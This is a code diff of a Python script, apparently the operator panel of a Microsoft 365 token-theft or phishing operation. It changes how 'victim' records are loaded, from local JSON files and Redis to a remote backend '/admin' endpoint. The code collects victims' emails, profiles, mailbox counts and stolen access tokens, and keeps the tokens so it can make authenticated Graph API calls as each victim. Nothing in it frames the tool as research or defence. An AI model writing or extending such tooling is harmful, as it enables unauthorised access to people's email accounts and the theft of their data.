@@ -6,11 +6,7 @@ from datetime import datetime
 from dotenv import load_dotenv
 from concurrent.futures import ThreadPoolExecutor
 import io
-import redis
 
-redis_url = os.getenv("REDIS_URL", "redis://localhost:6379/0")
-r = redis.from_url(redis_url)
-r.ping()
 
 load_dotenv()
 
@@ -26,25 +22,26 @@ executor = ThreadPoolExecutor(max_workers=20)
 
 
 
-
 def load_victims():
-    """Load victim data from Redis + victim JSON files"""
+    """Load victim data from serve.py /admin endpoint"""
     victims.clear()
     tokens.clear()
     
-    # Load victim files 
-    victim_files = [f for f in os.listdir(".") if f.startswith("victim_") and f.endswith(".json")]
+    try:
+        resp = requests.get(f"{BACKEND_URL}/admin", timeout=10)
+        data = resp.json()
+    except Exception as e:
+        print(f"❌ Failed to fetch from backend: {e}")
+        return 0
     
-    for filename in victim_files:
+    for filename, file_content in data.items():
         try:
-            filepath = filename
-            with open(filepath, 'r', encoding='utf-8') as f:
-                data = json.load(f)
+            victim_data = json.loads(file_content)
             
-            email = data['profile'].get('mail') or data['profile'].get('userPrincipalName', 'unknown')
-            display_name = data['profile'].get('displayName', 'Unknown')
+            email = victim_data['profile'].get('mail') or victim_data['profile'].get('userPrincipalName', 'unknown')
+            display_name = victim_data['profile'].get('displayName', 'Unknown')
             
-            token = data.get('tokens', {}).get('access_token')
+            token = victim_data.get('tokens', {}).get('access_token')
             if token and isinstance(token, str) and len(token) > 500:
                 tokens[email] = token
             
@@ -52,18 +49,22 @@ def load_victims():
                 'id': display_name,
                 'email': email,
                 'filename': filename,
-                'profile': data['profile'],
+                'profile': victim_data['profile'],
                 'last_seen': datetime.now().isoformat(),
-                'email_count': data.get('mailbox', {}).get('totalItemCount', 0),
+                'email_count': victim_data.get('mailbox', {}).get('totalItemCount', 0),
                 'token_status': '✅ Ready' if token else '❌ No Token',
-                'file_size': os.path.getsize(filepath)
+                'file_size': len(file_content.encode('utf-8'))
             }
-        except:
+        except Exception as e:
+            print(f"❌ Failed to parse {filename}: {e}")
             continue
     
-    print(f"📊 Loaded {len(victims)} victims from files")
+    print(f"📊 Loaded {len(victims)} victims from {BACKEND_URL}/admin")
     return len(victims)
+    
 
+    
+    
 def api_call(email, endpoint, method='GET', data=None, headers=None):
     """Make authenticated Graph API call for victim"""
     token = tokens.get(email)
